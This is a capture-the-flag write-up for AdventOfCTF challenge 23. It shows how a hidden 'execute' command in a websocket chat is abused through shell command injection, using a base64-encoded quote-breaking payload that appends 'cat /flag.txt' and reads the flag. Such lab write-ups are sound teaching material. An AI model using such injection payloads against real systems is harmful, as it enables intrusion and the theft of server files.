+++
author = "Maik de Kruif"
title = "Challenge 23 - AdventOfCTF"
date = 2021-03-16T20:52:38+01:00
description = "A writeup for challenge 23 of AdventOfCTF."
cover = "img/adventofctf/497784f7a3314f8aa5b8464432e30bbe.png"
tags = [
    "AdventOfCTF",
    "challenge",
    "ctf",
    "hacking",
    "writeup",
    "web",
    "websockets",
]
categories = [
    "ctf",
    "writeups",
    "hacking",
]
+++

- Points: 2300

## Description

If all you do is talk, there are bound to be secret features. The flag is stored in /flag.txt.

Visit https://23.adventofctf.com to start the challenge.

## Recon

When opening the page, we're greeted with, what looks like, a chat screen. If we type a message in the message box and send it, it appears on the screen.

If we take a look at the source, we also find a bit of javascript:

```js
$(function () {
  var socket = io();
  $("form").submit(function () {
    socket.emit("chat message", { message: $("#m").val() });
    $("#m").val("");
    return false;
  });
  socket.on("chat message", function (msg) {
    console.log(msg.command);
    if (msg.command === "code") {
      $("#messages").append($("<li>").html("<pre>" + msg.message + "</pre>"));
    } else {
      $("#messages").append($("<li>").text(msg.message));
    }
    window.scrollTo(0, document.body.scrollHeight);
  });
});
```

## Finding the vulnerability

From the JavaScript code we can see that the chat uses WebSockets. To take a deeper look at it, let's switch over to the network tab in Chrome and click on the request with the type "websocket".

{{< figure src="/img/adventofctf/23/websocket.png" title="Websocket in Chrome DevTools" >}}

If we click on it, a tab with the messages sent on the websocket will open. We can see some numbers here, these are just heartbeat packets to keep the connection alive. Now, let's send a new message and have a look at what it actually sends/receives.

After sending the message, the following entries are added to the websocket message list.

```js
⬆42["chat message", {message: "Hi"}]
⬇42["chat message", {message: "Hi"}]
```

We can see the message contains two parts; the event name and the message itself. We also only see a message variable, while in the javascript code we also saw it looked for a `"command"`. Let's try to manually add it to the message.

### Manually sending a message

In Chrome (to my knowledge) we can't easily send a message on a websocket. We could use Burp Suit to do it but for this writeup I'll stick with Chrome. To send a message on the websocket, we need the `socket` variable from the javascript code. To get it, go to the `Sources` tab and click on `(index)`. Now click on line number 28 to add a breakpoint there. We choose this place as it will trigger a breakpoint just before a message gets sent and we thus have access to the socket variable.

{{< figure src="/img/adventofctf/23/breakpoint.png" title="Javascipt breakpoint in Chrome" >}}

Now if we try to send a message, chrome will pause the page. The console will now also have the scope of the piece of code at the breakpoint. This means that if we enter `socket` in the console, will get the socket object back:

```js
> socket
< Socket {receiveBuffer: Array(0), sendBuffer: Array(0), ids: 0, acks: {…}, flags: {…}, …}
```

Let's save this object to the global scope so we can always access it. To do this, let's enter the following code in the console:

```js
window.socket = socket;
```

We can then click the continue button or press `F8` to continue the script. To verify we still have access to the socket, we can try to send a message using the console. I used the following code for this:

```js
socket.emit("chat message", { message: "Hello" });
```

After running this, we also see the message pop up in the chat window.

### Sending a command

Because the code tries to read `msg.command`, let's try adding a command to the message. We can do that using the following code:

```js
socket.emit("chat message", {
  message: "Hello",
  command: "ls",
});
```

As we expect from the code, `"ls"` is printed to the console but nothing else seems to happen. Maybe the command does not exist, let's try the common `help` command.

```js
socket.emit("chat message", { message: "Hello", command: "help" });
```

This time it returns a different message: "Allowed message types are: help, execute and empty".

## Exploit

The `execute` command looks interesting, so let's take a further look at it.

```js
socket.emit("chat message", { message: "Hello", command: "execute" });
```

Upon sending it, the server returns "Invalid BASE64". This probably means it is trying to read base64 encoded data. But from where? Let's try replacing the message with a base64 encoded command.

```bash
> echo -n "ls" | base64 -w 0
bHM=⏎
```

```js
socket.emit("chat message", { message: "bHM=", command: "execute" });
```

This time we got a different result:

```text
ERR: Error: Command failed: /bin/ls 'ls'
ls: ls: No such file or directory
```

This means the backend is trying to list the contents of "ls", let's try again with a `/` as the message:

```bash
> echo -n "/" | base64 -w 0
Lw==⏎
```

```js
socket.emit("chat message", { message: "Lw==", command: "execute" });
```

This returns the following:

```text
STDOUT: apps
bin
dev
etc
flag.txt
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

The only thing left is reading the `flag.txt` file. From the ls error we know the backend executes the following: `/bin/ls '[MESSAGE]'`. This means we have to construct a command that works around the quotes around our input. An example for the input would be `/'; cat '/flag.txt` as this makes the command become the following:

```bash
/bin/ls '/'; cat '/flag.txt'
```

Let's try that.

```bash
> echo -n "/'; cat '/flag.txt" | base64 -w 0
Lyc7IGNhdCAnL2ZsYWcudHh0⏎
```

```js
socket.emit("chat message", {
  message: "Lyc7IGNhdCAnL2ZsYWcudHh0",
  command: "execute",
});
```

This will give us the following output:

```text
STDOUT: apps
bin
dev
etc
flag.txt
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
NOVI{i_hacked_websockets_and_1_am_still_s@ne}
```

## Solution

We got the flag! It is `NOVI{i_hacked_websockets_and_1_am_still_s@ne}`.
